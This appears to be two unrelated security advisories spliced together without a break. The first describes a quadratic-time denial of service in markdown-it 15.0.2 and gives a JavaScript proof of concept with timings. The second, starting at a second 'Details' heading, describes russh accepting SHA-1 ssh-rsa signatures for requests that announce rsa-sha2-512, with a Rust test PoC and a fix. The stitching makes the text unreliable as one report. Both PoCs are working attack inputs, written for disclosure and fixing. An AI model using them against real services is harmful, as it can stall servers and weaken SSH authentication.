### Summary

A link reference definition whose label or title is never closed is O(n²) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4–5× per doubling. No options are required to trigger it.

### Details

src/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n²). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark §6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.

The observed output from PoC was:
unclosed title n=100000   200009 B    3585.5 ms
unclosed title n=200000   400009 B   18107.1 ms   (5.05x)
unclosed title n=400000   800009 B   73954.4 ms   (4.08x)

Regression comparison at 313 KB: 13.0.2 → 125 ms, 14.1.0 → 11.4 s, 15.0.0 → 10.6 s, 15.0.2 → 10.7 s.

### Proof of concept

How to execute the PoC:
1. mkdir -p markdown-it-poc && cd markdown-it-poc
2. npm init -y
3. npm i markdown-it@15.0.2
4. node poc_markdown_it.js

PoC below is:
```javascript
// poc_markdown_it.js
// Requires: npm install markdown-it@15.0.2
const MarkdownIt = require('markdown-it');
const md = new MarkdownIt();

function bench(label, src) {
  const t0 = process.hrtime.bigint();
  md.render(src);
  const t1 = process.hrtime.bigint();
  console.log(
    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`
  );
}

// Unclosed title: one reference definition spread over many lines
for (const n of [100000, 200000, 400000]) {
  bench(`unclosed title n=${n}`, '[a]: /u "' + 'x\n'.repeat(n));
}

// Unclosed label
for (const n of [5000, 10000, 20000]) {
  bench(`unclosed label n=${n}`, '[' + 'a\n'.repeat(n));
}
```

### Impact

This is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.

### Details

In `russh/src/server/encrypted.rs`, `server_read_auth_request_pk` (0.63.3, around lines 880-990):

* The requested algorithm name (`pubkey_algo`) is read and only used to decode the key: `PublicKeyOrCertificate::decode(&pubkey_algo, &pubkey_key)`. The derived `hash_alg` is then dropped (`PublicKeyOrCertificate::PublicKey { ref key, .. }`).
* The signature blob is decoded (`Signature::decode`) and verified with `Verifier::verify(&pubkey, &buf, &sig)`. `ssh-key` picks the hash from **the signature's own algorithm** (`sig.algorithm()`).
* `pubkey_algo` and `sig.algorithm()` are never compared.

So for an RSA key, the request can say `rsa-sha2-512` while the signature is `ssh-rsa`. The signature is valid for SHA-1, verification succeeds, and `Handler::auth_publickey` is called.

**Affected versions: every russh release, from the first (`0.34.0-beta.1`, 2022-03) through 0.63.3 and current `main`.** The behaviour is inherited from `thrussh`, which russh was forked from.

The mechanism changed over time, but the outcome is the same: the hash is always taken from the signature blob, never checked against the request.

* **Up to 0.46:** after reading the algorithm name inside the signature blob, russh overwrites the key's hash with it (`pubkey.set_algorithm(algo_)`), then verifies.
* **From 0.47/0.48 (move to `ssh-key`):** the signature is decoded with its own algorithm (`sig_workaround::Sig::decode`, later `Signature::decode`) and verified with it.

Confirmed by running the PoC below on 0.63.3. Confirmed by reading the code of `server/encrypted.rs` in 0.34.0-beta.1, 0.34.0, 0.36.0, 0.36.1, 0.37.1, 0.40.2, 0.43.0, 0.45.0, 0.46.0, 0.48.2, 0.50.4, 0.54.6, 0.58.1, 0.63.1, 0.63.3 and `main` (2026-09-30), and in thrussh 0.33.5.

### PoC

A unit test in the existing test module of `russh/src/server/encrypted.rs`. It uses the module's own helpers (`test_auth_session`, `sign_with_hash_alg`, `PrivateKeyWithHashAlg`) and needs no network or configuration.

1. Check out russh 0.63.3, or `main`.
2. Paste the code below inside `mod tests { ... }` of `russh/src/server/encrypted.rs`.
3. Run `cargo test --lib poc_sha1`.

```rust
// ---- PoC: signature algorithm not checked against the requested one ----

/// Records whether `auth_publickey` (called only after the signature
/// verified) was reached.
#[derive(Default)]
struct AcceptAnyKey {
    authenticated: bool,
}

impl Handler for AcceptAnyKey {
    type Error = Error;

    async fn auth_publickey_offered(
        &mut self,
        _user: &str,
        _public_key: &PublicKey,
    ) -> Result<Auth, Self::Error> {
        Ok(Auth::Accept)
    }

    async fn auth_publickey(
        &mut self,
        _user: &str,
        _public_key: &PublicKey,
    ) -> Result<Auth, Self::Error> {
        self.authenticated = true;
        Ok(Auth::Accept)
    }
}

/// A signed publickey request that names `announced` as its public key
/// algorithm, but is signed with `hash` (`None` = `ssh-rsa`, SHA-1).
fn signed_request_announcing(
    user: &str,
    private_key: Arc<PrivateKey>,
    announced: &str,
    hash: Option<crate::keys::HashAlg>,
) -> Vec<u8> {
    let mut packet = Vec::new();
    packet.push(msg::USERAUTH_REQUEST);
    user.encode(&mut packet).unwrap();
    "ssh-connection".encode(&mut packet).unwrap();
    "publickey".encode(&mut packet).unwrap();
    1u8.encode(&mut packet).unwrap();
    announced.encode(&mut packet).unwrap();
    private_key.public_key().to_bytes().unwrap().encode(&mut packet).unwrap();

    let mut signed = Vec::new();
    CryptoVec::new().as_ref().encode(&mut signed).unwrap();
    signed.extend_from_slice(&packet);
    let signature =
        sign_with_hash_alg(&PrivateKeyWithHashAlg::new(private_key, hash), &signed).unwrap();
    signature.encode(&mut packet).unwrap();
    packet
}

#[tokio::test]
async fn poc_sha1_signature_accepted_when_rsa_sha2_512_is_announced() {
    let rsa = ssh_key::private::RsaKeypair::random(&mut rand::rng(), 2048).unwrap();
    let private = Arc::new(PrivateKey::from(rsa));
    let mut session = test_auth_session();
    let mut handler = AcceptAnyKey::default();

    // The request says rsa-sha2-512; the signature blob is ssh-rsa (SHA-1).
    let packet = signed_request_announcing("alice", private, "rsa-sha2-512", None);
    session.process_packet(&mut handler, &packet).await.unwrap();

    // RFC 8332 §3: the signature algorithm must be the requested one, so
    // this request must be rejected. On russh 0.63.3 it is accepted.
    assert!(
        !handler.authenticated,
        "an ssh-rsa (SHA-1) signature was accepted for a request announcing rsa-sha2-512"
    );
}
```

Result on unmodified 0.63.3:

```
test server::encrypted::tests::poc_sha1_signature_accepted_when_rsa_sha2_512_is_announced ... FAILED
panicked at src/server/encrypted.rs: an ssh-rsa (SHA-1) signature was accepted for a request announcing rsa-sha2-512
```

With the fix below, the test passes and the whole library suite still passes: `cargo test --lib` gives 186 passed.

Suggested fix: reject a mismatch through the existing `reject_auth_request(until, ...)` path, so the constant rejection time is kept.

